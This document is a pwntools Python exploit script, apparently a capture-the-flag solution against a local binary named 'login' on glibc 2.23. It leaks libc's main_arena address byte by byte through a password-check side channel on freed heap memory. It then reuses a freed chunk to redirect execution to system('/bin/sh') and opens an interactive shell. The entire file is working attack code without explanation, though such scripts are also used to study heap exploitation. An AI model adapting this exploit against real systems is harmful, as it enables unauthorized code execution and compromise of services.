#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
# context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

io = process('./login')#  , env = {'LD_PRELOAD':'./libc-2.23.so'})
elf = ELF('./login')
libc = ELF('/glibc/2.23/64/lib/libc-2.23.so')
mainarena = 0x39bb20

def reg(uid, pslen, ps):
    io.sendlineafter('oice:\n', '2')
    io.sendlineafter('id:\n', str(uid))
    io.sendlineafter('length:\n', str(pslen))
    io.sendafter('word:\n', ps)

def login(uid, pslen, ps):
    io.sendlineafter('oice:\n', '1')
    io.sendlineafter('id:\n', str(uid))
    io.sendlineafter('length:\n', str(pslen))
    io.sendafter('word:\n', ps)

def edit(uid, ps):
    io.sendlineafter('oice:\n', '4')
    io.sendlineafter('id:\n', str(uid))
    io.sendafter('pass:\n', ps)

def delete(uid):
    io.sendlineafter('oice:\n', '3')
    io.sendlineafter('id:\n', str(uid))

if __name__ == '__main__':

    # guess the 5 byte of main_arena+88
    mainarenap88 = '\x7f'
    reg(0, 0x80, 'a'*8)
    for i in range(4):
        delete(0)
        reg(1+i, 0x80, 'b' * (4-i))
        for c in range(256):
            psd = 'b' * (4-i) + chr(c) + mainarenap88[::-1]
            login(1+i, 0x80, psd)
            info = io.recvuntil('---')
            if 'success' in info:
                mainarenap88 += chr(c)
                success('temp mainarenap88 :', u64(mainarenap88[::-1].rjust(6, '\x00').ljust(8, '\x00')))
                break
    mainarenap88 += chr((mainarena+88) & 0xff)
    libcbase = u64(mainarenap88[::-1].ljust(8, '\x00')) - mainarena - 88
    success('libcbase', libcbase)
    libc.address = libcbase
    system = libc.sym['system']
    binsh = libc.search('/bin/sh').next()
    delete(0)
    payload = p64(binsh) + p64(system) + p64(0x80)
    reg(5, 0x18, payload)
    login(0, 0x18, '/bin/sh')

    io.interactive()
    io.close()
